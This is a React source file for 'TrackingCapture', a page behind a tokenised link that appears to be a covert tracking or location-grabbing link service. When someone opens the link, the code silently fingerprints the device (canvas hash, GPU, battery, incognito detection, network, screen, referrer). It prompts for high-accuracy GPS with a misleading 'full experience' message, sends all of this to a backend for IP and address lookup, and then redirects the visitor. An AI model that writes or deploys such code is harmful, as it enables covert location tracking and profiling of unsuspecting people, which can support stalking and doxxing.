/**
 * TrackingCapture — /t/:token
 *
 * 1. Collects 30+ device/browser data points silently
 * 2. Requests GPS via browser prompt (enableHighAccuracy: true)
 * 3. POSTs everything to backend → backend does IP enrichment + Nominatim geocoding
 * 4. Redirects to destination URL
 */

import React, { useEffect, useRef, useState } from "react";
import { useParams } from "react-router-dom";
import { useGeoGrabber } from "../hooks/useGeoGrabber";

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || "http://localhost:5001";

// Bump version to clear old sessionStorage captures
function getCaptureKey(token) {
  return `traxelon_captured_v3_${token}`;
}

// ── Canvas fingerprint ──────────────────────────────────────────────────────
function getCanvasFingerprint() {
  try {
    const canvas = document.createElement("canvas");
    canvas.width = 200;
    canvas.height = 50;
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("Traxalon🔍", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,0.7)";
    ctx.fillText("Traxalon🔍", 4, 17);
    const dataUrl = canvas.toDataURL();
    // Simple hash
    let hash = 0;
    for (let i = 0; i < dataUrl.length; i++) {
      hash = (hash << 5) - hash + dataUrl.charCodeAt(i);
      hash |= 0;
    }
    return hash.toString(16);
  } catch {
    return null;
  }
}

// ── WebGL GPU info ──────────────────────────────────────────────────────────
function getGPUInfo() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return { gpu: null, gpuVendor: null };
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    if (!ext) return { gpu: null, gpuVendor: null };
    return {
      gpu: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || null,
      gpuVendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || null,
    };
  } catch {
    return { gpu: null, gpuVendor: null };
  }
}

// ── Battery info ─────────────────────────────────────────────────────────────
async function getBatteryInfo() {
  try {
    if (!navigator.getBattery) return {};
    const battery = await navigator.getBattery();
    return {
      batteryLevel: Math.round(battery.level * 100),
      batteryCharging: battery.charging,
    };
  } catch {
    return {};
  }
}

// ── Private/incognito detection (storage quota heuristic) ────────────────────
async function detectIncognito() {
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const { quota } = await navigator.storage.estimate();
      // Incognito mode typically limits quota to ~120MB
      return quota < 120 * 1024 * 1024;
    }
    return null;
  } catch {
    return null;
  }
}

// ── Network info ─────────────────────────────────────────────────────────────
function getNetworkInfo() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!conn) return {};
  return {
    connectionType: conn.effectiveType || null,     // "4g", "3g", "wifi" etc.
    connectionDownlink: conn.downlink || null,       // Mbps
    connectionRtt: conn.rtt || null,                // ms
    connectionSaveData: conn.saveData || false,
  };
}

// ── Collect ALL device info ───────────────────────────────────────────────────
async function collectDeviceInfo() {
  const [battery, incognito] = await Promise.all([
    getBatteryInfo(),
    detectIncognito(),
  ]);
  const { gpu, gpuVendor } = getGPUInfo();
  const network = getNetworkInfo();
  const canvasHash = getCanvasFingerprint();

  return {
    // Hardware
    cpuCores: navigator.hardwareConcurrency || null,
    ram: navigator.deviceMemory || null,              // GB (approximate)
    gpu,
    gpuVendor,
    maxTouchPoints: navigator.maxTouchPoints ?? null,

    // Battery
    batteryLevel: battery.batteryLevel ?? null,
    batteryCharging: battery.batteryCharging ?? null,

    // Screen & Display
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    screenAvailWidth: window.screen.availWidth || null,
    screenAvailHeight: window.screen.availHeight || null,
    colorDepth: window.screen.colorDepth || null,
    pixelDepth: window.screen.pixelDepth || null,
    pixelRatio: window.devicePixelRatio || null,
    windowWidth: window.innerWidth || null,
    windowHeight: window.innerHeight || null,

    // Browser
    language: navigator.language || null,
    languages: navigator.languages ? navigator.languages.join(", ") : null,
    platform: navigator.platform || null,
    cookiesEnabled: navigator.cookieEnabled ?? null,
    doNotTrack: navigator.doNotTrack || null,
    historyLength: window.history.length || null,
    referrer: document.referrer || null,

    // Network
    ...network,

    // Privacy
    incognito: incognito ?? null,

    // Fingerprint
    canvasHash,
  };
}

// ─────────────────────────────────────────────────────────────────────────────

export default function TrackingCapture() {
  const { token } = useParams();
  const [status, setStatus] = useState("📍 Allow location for full experience…");
  const hasSent = useRef(false);

  // Requests GPS with enableHighAccuracy: true, falls back to IP if denied
  const { location, loading } = useGeoGrabber();

  useEffect(() => {
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) {
      setStatus("Redirecting…");
    }
  }, [token]);

  useEffect(() => {
    if (loading) return;
    if (hasSent.current) return;
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) return;

    hasSent.current = true;
    sessionStorage.setItem(key, "1");
    sendCapture();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [loading]);

  async function sendCapture() {
    setStatus("Redirecting…");
    let destinationUrl = null;

    try {
      // Collect all device data in parallel with location being ready
      const deviceInfo = await collectDeviceInfo();

      const payload = {
        token,

        // GPS raw coords — backend does Nominatim reverse geocoding
        gpsLat: location?.source === "gps" ? (location?.lat ?? null) : null,
        gpsLon: location?.source === "gps" ? (location?.lon ?? null) : null,
        gpsAccuracy: location?.source === "gps" ? (location?.gpsAccuracy ?? null) : null,

        // All device info
        ...deviceInfo,
      };

      console.log("[TrackingCapture] payload:", payload);

      const res = await fetch(`${BACKEND_URL}/api/links/capture`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();
      console.log("[TrackingCapture] response:", data);
      destinationUrl = data?.destinationUrl ?? null;
    } catch (err) {
      console.error("[TrackingCapture] error:", err);
    }

    if (destinationUrl) {
      window.location.replace(destinationUrl);
    }
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        background: "#ffffff",
        fontFamily: "sans-serif",
      }}
    >
      <div style={{ textAlign: "center", color: "#888", fontSize: 14 }}>
        <div
          style={{
            width: 36,
            height: 36,
            border: "3px solid #f0f0f0",
            borderTop: "3px solid #4a90e2",
            borderRadius: "50%",
            margin: "0 auto 16px",
            animation: "spin 0.9s linear infinite",
          }}
        />
        <div style={{ color: "#555", fontSize: 14 }}>{status}</div>
      </div>
      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  );
}